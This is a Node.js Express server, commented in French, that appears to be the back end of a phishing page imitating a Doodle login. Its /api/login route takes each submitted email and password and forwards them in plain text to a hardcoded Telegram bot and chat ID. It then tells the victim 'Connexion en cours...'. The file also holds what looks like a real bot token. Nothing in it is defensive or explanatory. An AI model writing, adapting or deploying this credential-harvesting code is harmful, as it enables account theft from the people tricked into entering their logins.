require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuration Telegram
const TELEGRAM_BOT_TOKEN = '8887264423:AAHhoKNn1H82iVM6vM7QpILYsm4Ua2eW8FE';
const TELEGRAM_CHAT_ID = '6276768700';

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Route pour servir l'interface HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Route pour recevoir les données de connexion
app.post('/api/login', async (req, res) => {
    try {
        const { email, password } = req.body;

        // Validation basique
        if (!email || !password) {
            return res.status(400).json({ 
                success: false, 
                message: 'Email et mot de passe requis' 
            });
        }

        // Formater le message pour Telegram
        const timestamp = new Date().toLocaleString('fr-FR');
        const message = `
🔐 <b>NOUVELLE CONNEXION DOODLE</b> 🔐

📧 <b>Email:</b> <code>${email}</code>
🔑 <b>Mot de passe:</b> <code>${password}</code>
⏰ <b>Heure:</b> ${timestamp}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;

        // Envoyer le message à Telegram
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });

        console.log('✅ Message envoyé à Telegram:', response.data);

        // Répondre au client
        res.json({
            success: true,
            message: 'Connexion en cours...',
            telegramResponse: response.data
        });

    } catch (error) {
        console.error('❌ Erreur:', error.message);
        res.status(500).json({
            success: false,
            message: 'Erreur lors de l\'envoi des données',
            error: error.message
        });
    }
});

// Route de test
app.get('/api/test', (req, res) => {
    res.json({
        status: 'Le serveur fonctionne! 🚀',
        bot_token: 'Configuré ✅',
        chat_id: 'Configuré ✅'
    });
});

// Démarrer le serveur
app.listen(PORT, () => {
    console.log(`
🚀 Serveur Doodle démarré sur http://localhost:${PORT}`);
    console.log(`📱 Telegram Bot Token: ${TELEGRAM_BOT_TOKEN.substring(0, 10)}...`);
    console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID}`);
    console.log(`\n✅ Prêt à recevoir les connexions!\n`);
});

module.exports = app;